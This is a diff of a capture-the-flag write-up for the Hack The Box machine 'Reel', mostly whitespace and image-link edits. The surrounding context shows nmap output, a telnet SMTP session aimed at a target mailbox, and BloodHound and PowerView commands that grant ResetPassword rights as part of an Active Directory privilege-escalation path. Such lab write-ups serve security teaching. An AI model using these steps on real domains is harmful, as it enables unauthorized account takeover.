@@ -22,36 +22,36 @@ PORT      STATE SERVICE      VERSION
 21/tcp    open  ftp          Microsoft ftpd
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
 |_05-29-18  12:19AM       <DIR>          documents
-| ftp-syst: 
+| ftp-syst:
 |_  SYST: Windows_NT
 22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
 |   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
 |_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
 25/tcp    open  smtp?
-| fingerprint-strings: 
-|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: 
+| fingerprint-strings:
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe:
 |     220 Mail Service ready
-|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
+|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest:
 |     220 Mail Service ready
 |     sequence of commands
 |     sequence of commands
-|   Hello: 
+|   Hello:
 |     220 Mail Service ready
 |     EHLO Invalid domain address.
-|   Help: 
+|   Help:
 |     220 Mail Service ready
 |     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
-|   SIPOptions: 
+|   SIPOptions:
 |     220 Mail Service ready
 |     sequence of commands
 |     sequence of commands
-|   TerminalServerCookie: 
+|   TerminalServerCookie:
 |     220 Mail Service ready
 |_    sequence of commands
-| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP, 
-|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 
+| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP,
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
 135/tcp   open  msrpc        Microsoft Windows RPC
 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
 445/tcp   open  microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)
@@ -108,7 +108,7 @@ telnet 10.10.10.77.25
 220 Mail Service ready
 HELO testdomain.com
 250 Hello.
-MAIL FROM: <test@test.com> 
+MAIL FROM: <test@test.com>
 250 OK
 RCPT TO: <nico@megabank.com>
 250 OK
@@ -229,7 +229,7 @@ After that we can start Bloodhound and login with the credentials we entered and
 
 We can see that _Tom_ and _Nico_ are group members of **Print Operators** and this group has a path to _Administrator_:
 
-![Shortest Paths to High Value Targets](https://kyuu-ji.github.io/htb-write-up/reel/BH_query_1.png)
+![Shortest Paths to High Value Targets](reel_BH-query-1.png)
 
 This is no direct path, so we need to look for groups we care about and that BloodHound just doesn't know. If we look at the groups of the users manually, we see the group **Backup_Admins** that we need to query in BloodHound.
 ```markdown
@@ -243,15 +243,15 @@ Invoke-Bloodhound -CollectionMethod All
 
 Now the same query as last time has a lot more information:
 
-![Shortest Paths to High Value Targets with CollectionMethod All](https://kyuu-ji.github.io/htb-write-up/reel/BH_query_2.png)
+![Shortest Paths to High Value Targets with CollectionMethod All](reel_BH-query-2.png)
 
 If we query for a path from **NICO@HTB.LOCAL** to **BACKUP_ADMINS@HTB.LOCAL** we see that Nico has _WriteOwner_ permissions to **Herman@htb.local** who has _GenericWrite_ and _WriteDacl_ to the Backup_Admins group:
 
-![Nico to Backup_Admins group](https://kyuu-ji.github.io/htb-write-up/reel/BH_query_3.png)
+![Nico to Backup_Admins group](reel_BH-query-3.png)
 
 And the same is true for _Tom_ to **Claire@htb.local**:
 
-![Tom to Backup_Admins group](https://kyuu-ji.github.io/htb-write-up/reel/BH_query_4.png)
+![Tom to Backup_Admins group](reel_BH-query-4.png)
 
 All Active Directory privileges are explained on [ADSecurity.org](https://adsecurity.org/?p=3658).
 
@@ -278,7 +278,7 @@ Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetP
 
 If we run BloodHound again, we see new permissions **Owns** and **ForcePasswordChange** for _Tom_:
 
-![Tom to Backup_Admins group - Owns Claire](https://kyuu-ji.github.io/htb-write-up/reel/BH_query_5.png)
+![Tom to Backup_Admins group - Owns Claire](reel_BH-query-5.png)
 
 So we will change the password of _Claire_:
 ```powershell
